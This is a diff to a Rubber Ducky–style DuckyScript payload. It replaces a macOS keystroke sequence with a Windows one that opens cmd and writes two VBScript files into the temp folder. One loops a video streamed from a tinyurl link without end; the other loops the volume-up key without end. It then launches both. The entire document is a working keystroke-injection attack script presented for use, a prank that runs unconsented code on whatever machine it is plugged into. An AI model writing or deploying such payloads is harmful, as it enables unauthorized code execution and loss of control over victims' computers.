@@ -1,5 +1,33 @@
-GUI q
-DELAY 250
-STRING brave
-RIGHTARROW
+REM https://github.com/raspberrydeveloper/pyducky/blob/main/src/scripts/rickrollcomp.dd
+DELAY 3500
+GUI r
+DELAY 200
+STRINGLN cmd
+DELAY 500
+STRINGLN del %tmp%\rickyou.vbs
+DELAY 200
+STRINGLN del %tmp%\volup.vbs
+DELAY 200
+STRINGLN cd %tmp% && copy con rickyou.vbs
+STRINGLN While true
+STRINGLN Dim oPlayer
+STRINGLN Set oPlayer = CreateObject("WMPlayer.OCX")
+STRINGLN oPlayer.URL = "tinyurl.com/s63ve48"
+STRINGLN oPlayer.controls.play
+STRINGLN While oPlayer.playState <> 1 ' 1 = Stopped
+STRINGLN WScript.Sleep 100
+STRINGLN Wend
+STRINGLN oPlayer.close
+STRINGLN Wend
+DELAY 100
+CTRL z
 ENTER
+STRINGLN copy con volup.vbs
+STRINGLN do
+STRINGLN Set WshShell = CreateObject("WScript.Shell")
+STRINGLN WshShell.SendKeys(chr(&hAF))
+STRINGLN loop
+CTRL z
+ENTER
+STRINGLN start rickyou.vbs && volup.vbs
+STRINGLN exit
